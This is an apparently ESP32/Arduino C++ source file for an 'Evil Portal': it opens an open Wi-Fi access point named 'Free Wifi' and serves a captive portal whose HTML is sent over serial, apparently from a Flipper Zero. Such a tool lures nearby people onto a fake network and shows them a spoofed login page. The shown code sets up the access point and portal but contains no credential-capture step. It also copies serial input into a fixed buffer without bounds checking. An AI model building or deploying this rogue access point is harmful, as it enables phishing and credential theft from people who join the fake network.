#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include <WiFiManager.h>

#define MAX_HTML_SIZE 20000
#define SD_CS 10

WiFiManager wifiManager;

class EvilPortal {
private:
  const char *ssid;
  const char *password;
  bool has_html = false;
  char HTML[MAX_HTML_SIZE] = "";

public:
  EvilPortal(const char *SSID = "Free Wifi") {
    ssid = SSID;
  };

  void begin() {

    Serial.println("Waiting For HTML Within Begin");
    loop();

    if (!wifiManager.startConfigPortal(ssid, NULL, HTML)) {
      Serial.println("failed to connect and hit timeout");
      delay(3000);
      return;
    }

    Serial.printf("Evil Portal Started at %s", WiFi.softAPIP().toString().c_str());
  }

  void loop() {
    Serial.println("Waiting for HTML Within Loop");
    while (!has_html) {
      if (Serial.available() > 0) {
        Serial.println("About to Read String");
        String flipperMessage = Serial.readString();
        Serial.println("Got Message");
        const char *serialMessage = flipperMessage.c_str();
        Serial.println("String Compare");
        if (strncmp(serialMessage, "sethtml=", strlen("sethtml=")) == 0) {
          Serial.println("String Compare Complete");
          serialMessage += strlen("sethtml=");
          strncpy(HTML, serialMessage, strlen(serialMessage) - 1);
          has_html = true;
          Serial.println("html set");
        }
      }
    }
    Serial.println("all set");
  }
};